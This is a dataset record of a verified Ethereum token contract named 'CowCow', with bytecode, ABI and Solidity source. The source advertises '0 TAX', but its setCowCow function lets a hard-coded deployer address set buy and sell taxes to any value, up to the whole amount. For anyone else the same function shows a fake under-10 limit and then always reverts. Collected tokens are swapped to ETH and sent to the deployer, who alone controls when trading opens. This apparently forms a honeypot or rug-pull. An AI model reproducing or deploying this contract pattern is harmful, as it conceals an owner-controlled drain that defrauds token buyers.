{
    "address": "0x63510220e2906941EC16BF742607fdC785454f17",
    "tx_hash": "b1c46ce4704a3a5f817832fdc326d8b8cdb9bd03300b526f7eb82d06980c7fbc",
    "block_number": 18002361,
    "timestamp": 1693095323,
    "gas_used_in_creation": 3277798,
    "creation_bytecode": "60a0604052600060028190556003556004805460ff191690553480156200002557600080fd5b50737a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000079573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200009f9190620001e8565b6040516364e329cb60e11b815230600482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc260248201526001600160a01b03919091169063c9c65396906044016020604051808303816000875af115801562000102573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001289190620001e8565b6001600160a01b0316608052620001426009600a6200032f565b62000152906305f5e10062000340565b336000818152602081815260408083209490945530825260018152838220737a250d5630b4cf539739df2c5dacb4c659f2488d835290529182206000199055907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef620001c16009600a6200032f565b620001d1906305f5e10062000340565b60405190815260200160405180910390a36200035a565b600060208284031215620001fb57600080fd5b81516001600160a01b03811681146200021357600080fd5b9392505050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115620002715781600019048211156200025557620002556200021a565b808516156200026357918102915b93841c939080029062000235565b509250929050565b6000826200028a5750600162000329565b81620002995750600062000329565b8160018114620002b25760028114620002bd57620002dd565b600191505062000329565b60ff841115620002d157620002d16200021a565b50506001821b62000329565b5060208310610133831016604e8410600b841016171562000302575081810a62000329565b6200030e838362000230565b80600019048211156200032557620003256200021a565b0290505b92915050565b60006200021360ff84168362000279565b80820281158282048414176200032957620003296200021a565b608051610c13620003846000396000818161043d01528181610501015261075a0152610c136000f3fe6080604052600436106100a05760003560e01c80635c3d1fa6116100645780635c3d1fa61461018f57806370a08231146101b157806395d89b41146101de578063a9059cbb14610210578063c9567bf914610230578063dd62ed3e1461024557600080fd5b806306fdde03146100ac578063095ea7b3146100f557806318160ddd1461012557806323b872dd14610148578063313ce5671461016857600080fd5b366100a757005b600080fd5b3480156100b857600080fd5b506100df60405180604001604052806007815260200166436f7720436f7760c81b81525081565b6040516100ec91906108ae565b60405180910390f35b34801561010157600080fd5b50610115610110366004610918565b61027d565b60405190151581526020016100ec565b34801561013157600080fd5b5061013a6102ea565b6040519081526020016100ec565b34801561015457600080fd5b50610115610163366004610942565b610307565b34801561017457600080fd5b5061017d600981565b60405160ff90911681526020016100ec565b34801561019b57600080fd5b506101af6101aa36600461097e565b610355565b005b3480156101bd57600080fd5b5061013a6101cc3660046109a0565b60006020819052908152604090205481565b3480156101ea57600080fd5b506100df60405180604001604052806006815260200165434f57434f5760d01b81525081565b34801561021c57600080fd5b5061011561022b366004610918565b610396565b34801561023c57600080fd5b506101af6103aa565b34801561025157600080fd5b5061013a6102603660046109bb565b600160209081526000928352604080842090915290825290205481565b3360008181526001602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906102d89086815260200190565b60405180910390a35060015b92915050565b6102f66009600a610ae8565b610304906305f5e100610af7565b81565b6001600160a01b038316600090815260016020908152604080832033845290915281208054839190839061033c908490610b0e565b9091555061034d90508484846103d9565b949350505050565b73f3a13806b7a052af1443072026852deee2e4f86d19330161037c57600291909155600355565b600a821061038957600080fd5b600a81106100a757600080fd5b60006103a33384846103d9565b9392505050565b3373f3a13806b7a052af1443072026852deee2e4f86e146103ca57600080fd5b6004805460ff19166001179055565b6001600160a01b038316600090815260208190526040812080548391908390610403908490610b0e565b90915550506001600160a01b03841673f3a13806b7a052af1443072026852deee2e4f86e1461043b5760045460ff1661043b57600080fd5b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316836001600160a01b03161415801561049a57506001600160a01b03831673f3a13806b7a052af1443072026852deee2e4f86e14155b156104ff5760646104ad6009600a610ae8565b6104bb906305f5e100610af7565b6104c6906064610af7565b6104d09190610b21565b6001600160a01b0384166000908152602081905260409020546104f4908490610b43565b11156104ff57600080fd5b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316836001600160a01b03161480156105485750600454610100900460ff16155b801561058957506103e861055e6009600a610ae8565b61056c906305f5e100610af7565b6105769190610b21565b3060009081526020819052604090205410155b15610719576004805461ff00191661010017905560408051600280825260608201835260009260208301908036833701905050905030816000815181106105d2576105d2610b56565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28160018151811061061a5761061a610b56565b6001600160a01b0390921660209283029190910190910152737a250d5630b4cf539739df2c5dacb4c659f2488d63791ac9476103e861065b6009600a610ae8565b610669906305f5e100610af7565b6106739190610b21565b60008430426040518663ffffffff1660e01b8152600401610698959493929190610b6c565b600060405180830381600087803b1580156106b257600080fd5b505af11580156106c6573d6000803e3d6000fd5b505060405173f3a13806b7a052af1443072026852deee2e4f86e92504780156108fc029250906000818181858888f1935050505015801561070b573d6000803e3d6000fd5b50506004805461ff00191690555b6001600160a01b038416301480159061074f57506001600160a01b03831673f3a13806b7a052af1443072026852deee2e4f86e14155b1561082857600060647f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316866001600160a01b0316146107995760035461079d565b6002545b6107a79085610af7565b6107b19190610b21565b90506107bd8184610b0e565b306000908152602081905260408120805492955083929091906107e1908490610b43565b909155505060405181815230906001600160a01b038716907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a3505b6001600160a01b03831660009081526020819052604081208054849290610850908490610b43565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161089c91815260200190565b60405180910390a35060019392505050565b600060208083528351808285015260005b818110156108db578581018301518582016040015282016108bf565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b038116811461091357600080fd5b919050565b6000806040838503121561092b57600080fd5b610934836108fc565b946020939093013593505050565b60008060006060848603121561095757600080fd5b610960846108fc565b925061096e602085016108fc565b9150604084013590509250925092565b6000806040838503121561099157600080fd5b50508035926020909101359150565b6000602082840312156109b257600080fd5b6103a3826108fc565b600080604083850312156109ce57600080fd5b6109d7836108fc565b91506109e5602084016108fc565b90509250929050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115610a3f578160001904821115610a2557610a256109ee565b80851615610a3257918102915b93841c9390800290610a09565b509250929050565b600082610a56575060016102e4565b81610a63575060006102e4565b8160018114610a795760028114610a8357610a9f565b60019150506102e4565b60ff841115610a9457610a946109ee565b50506001821b6102e4565b5060208310610133831016604e8410600b8410161715610ac2575081810a6102e4565b610acc8383610a04565b8060001904821115610ae057610ae06109ee565b029392505050565b60006103a360ff841683610a47565b80820281158282048414176102e4576102e46109ee565b818103818111156102e4576102e46109ee565b600082610b3e57634e487b7160e01b600052601260045260246000fd5b500490565b808201808211156102e4576102e46109ee565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015610bbc5784516001600160a01b031683529383019391830191600101610b97565b50506001600160a01b0396909616606085015250505060800152939250505056fea26469706673582212200159207f7c5de3ff471ad1bf36402b96d4764e02fdad89d51ffb09f53f97814364736f6c63430008120033",
    "runtime_bytecode": "6080604052600436106100a05760003560e01c80635c3d1fa6116100645780635c3d1fa61461018f57806370a08231146101b157806395d89b41146101de578063a9059cbb14610210578063c9567bf914610230578063dd62ed3e1461024557600080fd5b806306fdde03146100ac578063095ea7b3146100f557806318160ddd1461012557806323b872dd14610148578063313ce5671461016857600080fd5b366100a757005b600080fd5b3480156100b857600080fd5b506100df60405180604001604052806007815260200166436f7720436f7760c81b81525081565b6040516100ec91906108ae565b60405180910390f35b34801561010157600080fd5b50610115610110366004610918565b61027d565b60405190151581526020016100ec565b34801561013157600080fd5b5061013a6102ea565b6040519081526020016100ec565b34801561015457600080fd5b50610115610163366004610942565b610307565b34801561017457600080fd5b5061017d600981565b60405160ff90911681526020016100ec565b34801561019b57600080fd5b506101af6101aa36600461097e565b610355565b005b3480156101bd57600080fd5b5061013a6101cc3660046109a0565b60006020819052908152604090205481565b3480156101ea57600080fd5b506100df60405180604001604052806006815260200165434f57434f5760d01b81525081565b34801561021c57600080fd5b5061011561022b366004610918565b610396565b34801561023c57600080fd5b506101af6103aa565b34801561025157600080fd5b5061013a6102603660046109bb565b600160209081526000928352604080842090915290825290205481565b3360008181526001602090815260408083206001600160a01b038716808552925280832085905551919290917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906102d89086815260200190565b60405180910390a35060015b92915050565b6102f66009600a610ae8565b610304906305f5e100610af7565b81565b6001600160a01b038316600090815260016020908152604080832033845290915281208054839190839061033c908490610b0e565b9091555061034d90508484846103d9565b949350505050565b73f3a13806b7a052af1443072026852deee2e4f86d19330161037c57600291909155600355565b600a821061038957600080fd5b600a81106100a757600080fd5b60006103a33384846103d9565b9392505050565b3373f3a13806b7a052af1443072026852deee2e4f86e146103ca57600080fd5b6004805460ff19166001179055565b6001600160a01b038316600090815260208190526040812080548391908390610403908490610b0e565b90915550506001600160a01b03841673f3a13806b7a052af1443072026852deee2e4f86e1461043b5760045460ff1661043b57600080fd5b7f00000000000000000000000073ad4b7c02ee6a1764d0769e1d065d4cdb1b5e446001600160a01b0316836001600160a01b03161415801561049a57506001600160a01b03831673f3a13806b7a052af1443072026852deee2e4f86e14155b156104ff5760646104ad6009600a610ae8565b6104bb906305f5e100610af7565b6104c6906064610af7565b6104d09190610b21565b6001600160a01b0384166000908152602081905260409020546104f4908490610b43565b11156104ff57600080fd5b7f00000000000000000000000073ad4b7c02ee6a1764d0769e1d065d4cdb1b5e446001600160a01b0316836001600160a01b03161480156105485750600454610100900460ff16155b801561058957506103e861055e6009600a610ae8565b61056c906305f5e100610af7565b6105769190610b21565b3060009081526020819052604090205410155b15610719576004805461ff00191661010017905560408051600280825260608201835260009260208301908036833701905050905030816000815181106105d2576105d2610b56565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28160018151811061061a5761061a610b56565b6001600160a01b0390921660209283029190910190910152737a250d5630b4cf539739df2c5dacb4c659f2488d63791ac9476103e861065b6009600a610ae8565b610669906305f5e100610af7565b6106739190610b21565b60008430426040518663ffffffff1660e01b8152600401610698959493929190610b6c565b600060405180830381600087803b1580156106b257600080fd5b505af11580156106c6573d6000803e3d6000fd5b505060405173f3a13806b7a052af1443072026852deee2e4f86e92504780156108fc029250906000818181858888f1935050505015801561070b573d6000803e3d6000fd5b50506004805461ff00191690555b6001600160a01b038416301480159061074f57506001600160a01b03831673f3a13806b7a052af1443072026852deee2e4f86e14155b1561082857600060647f00000000000000000000000073ad4b7c02ee6a1764d0769e1d065d4cdb1b5e446001600160a01b0316866001600160a01b0316146107995760035461079d565b6002545b6107a79085610af7565b6107b19190610b21565b90506107bd8184610b0e565b306000908152602081905260408120805492955083929091906107e1908490610b43565b909155505060405181815230906001600160a01b038716907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a3505b6001600160a01b03831660009081526020819052604081208054849290610850908490610b43565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8460405161089c91815260200190565b60405180910390a35060019392505050565b600060208083528351808285015260005b818110156108db578581018301518582016040015282016108bf565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b038116811461091357600080fd5b919050565b6000806040838503121561092b57600080fd5b610934836108fc565b946020939093013593505050565b60008060006060848603121561095757600080fd5b610960846108fc565b925061096e602085016108fc565b9150604084013590509250925092565b6000806040838503121561099157600080fd5b50508035926020909101359150565b6000602082840312156109b257600080fd5b6103a3826108fc565b600080604083850312156109ce57600080fd5b6109d7836108fc565b91506109e5602084016108fc565b90509250929050565b634e487b7160e01b600052601160045260246000fd5b600181815b80851115610a3f578160001904821115610a2557610a256109ee565b80851615610a3257918102915b93841c9390800290610a09565b509250929050565b600082610a56575060016102e4565b81610a63575060006102e4565b8160018114610a795760028114610a8357610a9f565b60019150506102e4565b60ff841115610a9457610a946109ee565b50506001821b6102e4565b5060208310610133831016604e8410600b8410161715610ac2575081810a6102e4565b610acc8383610a04565b8060001904821115610ae057610ae06109ee565b029392505050565b60006103a360ff841683610a47565b80820281158282048414176102e4576102e46109ee565b818103818111156102e4576102e46109ee565b600082610b3e57634e487b7160e01b600052601260045260246000fd5b500490565b808201808211156102e4576102e46109ee565b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015610bbc5784516001600160a01b031683529383019391830191600101610b97565b50506001600160a01b0396909616606085015250505060800152939250505056fea26469706673582212200159207f7c5de3ff471ad1bf36402b96d4764e02fdad89d51ffb09f53f97814364736f6c63430008120033",
    "contract_name": "CowCow",
    "compiler_version": "v0.8.18+commit.87f61d96",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSellTax\",\"type\":\"uint256\"}],\"name\":\"setCowCow\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/**\r\n\r\nWeb3 lifestyle brand. Cow together, vibe together.\r\n\r\n0 TAX\r\n\r\nTG: https://t.me/CowCowPortal\r\nTW: https://twitter.com/CowCowETH\r\nWEB: https://cowcow.website\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity =0.8.18;\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n\r\n}\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n \r\ncontract CowCow {\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n\r\n    string public constant name = \"Cow Cow\";   \r\n    string public constant symbol = \"COWCOW\";   \r\n    uint8 public constant decimals = 9;\r\n    uint256 public constant totalSupply = 100_000_000 * 10**decimals;\r\n\r\n    uint256 buyTax = 0;\r\n    uint256 sellTax = 0;\r\n    uint256 constant swapAmount = totalSupply / 1000;\r\n    uint256 constant maxWallet = 100 * totalSupply / 100;\r\n\r\n    bool tradingOpened = false;\r\n    bool swapping;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    address immutable pair;\r\n    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n    address payable constant deployer = payable(address(0xF3A13806B7A052aF1443072026852DeEe2E4f86e));\r\n\r\n    constructor() {\r\n        pair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(address(this), ETH);\r\n        balanceOf[msg.sender] = totalSupply;\r\n        allowance[address(this)][routerAddress] = type(uint256).max;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool){\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool){\r\n        return _transfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n        allowance[from][msg.sender] -= amount;        \r\n        return _transfer(from, to, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n        balanceOf[from] -= amount;\r\n\r\n        if(from != deployer)\r\n            require(tradingOpened);\r\n\r\n        if(to != pair && to != deployer)\r\n            require(balanceOf[to] + amount <= maxWallet);\r\n\r\n        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\r\n            swapping = true;\r\n            address[] memory path = new  address[](2);\r\n            path[0] = address(this);\r\n            path[1] = ETH;\r\n            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                swapAmount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n            deployer.transfer(address(this).balance);\r\n            swapping = false;\r\n        }\r\n\r\n        if(from != address(this) && to != deployer){\r\n            uint256 taxAmount = amount * (from == pair ? buyTax : sellTax) / 100;\r\n            amount -= taxAmount;\r\n            balanceOf[address(this)] += taxAmount;\r\n            emit Transfer(from, address(this), taxAmount);\r\n        }\r\n        balanceOf[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function openTrading() external {\r\n        require(msg.sender == deployer);\r\n        tradingOpened = true;\r\n    }\r\n\r\n    function setCowCow(uint256 newBuyTax, uint256 newSellTax) external {\r\n        if(msg.sender == deployer){\r\n            buyTax = newBuyTax;\r\n            sellTax = newSellTax;\r\n        }\r\n        else{\r\n            require(newBuyTax < 10);\r\n            require(newSellTax < 10);\r\n            revert();\r\n        }\r\n        \r\n    }\r\n}",
    "etherscan_verified": true
}